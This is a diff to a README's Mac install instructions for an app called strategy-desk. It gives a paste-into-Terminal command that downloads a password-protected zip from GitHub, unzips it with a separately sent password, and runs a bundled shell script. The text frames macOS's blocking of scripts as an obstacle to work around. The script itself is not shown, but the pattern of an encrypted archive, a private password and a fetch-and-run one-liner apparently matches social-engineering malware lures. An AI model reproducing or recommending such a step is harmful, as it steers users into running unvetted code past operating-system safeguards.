@@ -20,10 +20,10 @@ You need Node.js 22 or newer.
 
 Windows: unzip the archive and double-click `install-desk.bat`.
 
-Mac: do not double-click a script, and do not run it from Downloads. macOS blocks both. Open **Terminal**, paste this, and press Return. Type the archive password when `unzip` asks for it.
+Mac: do not double-click a script, and do not run it from Downloads. macOS blocks both. Open **Terminal**, paste the command below, and press Return. Replace `PASSWORD` with the archive password you were sent. The password stays visible in the command. If a key icon is showing, press Control-C first. That icon hides typing and will not accept a paste.
 
 ```bash
-cd "$HOME" && curl -fsSL -o strategy-desk.zip "https://github.com/JPFava/strategy-desk/raw/main/public/strategy-desk.zip" && unzip strategy-desk.zip && cd strategy-desk && bash install-desk.sh
+cd "$HOME" && curl -fsSL -o strategy-desk.zip "https://github.com/JPFava/strategy-desk/raw/main/public/strategy-desk.zip" && unzip -P 'PASSWORD' strategy-desk.zip && cd strategy-desk && bash install-desk.sh
 ```
 
 The command downloads the desk into the home folder, where Terminal is allowed to run it. It installs Node.js 22 or newer when that is missing, installs the desk packages, starts the desk, and opens `http://127.0.0.1:8080`.
